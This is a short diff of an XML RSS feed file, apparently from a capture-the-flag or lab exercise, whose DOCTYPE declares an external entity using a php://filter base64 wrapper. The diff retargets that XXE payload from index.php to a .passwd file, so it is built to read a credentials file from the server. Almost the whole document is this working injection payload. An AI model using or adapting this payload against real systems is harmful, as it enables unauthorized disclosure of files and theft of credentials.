@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [
-<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd">]>
 <rss version="2.0">
   <channel>
     <title>Ví dụ RSS Feed</title>
@@ -23,6 +23,7 @@
     </item>
   </channel>
 </rss>
+
 
 
 
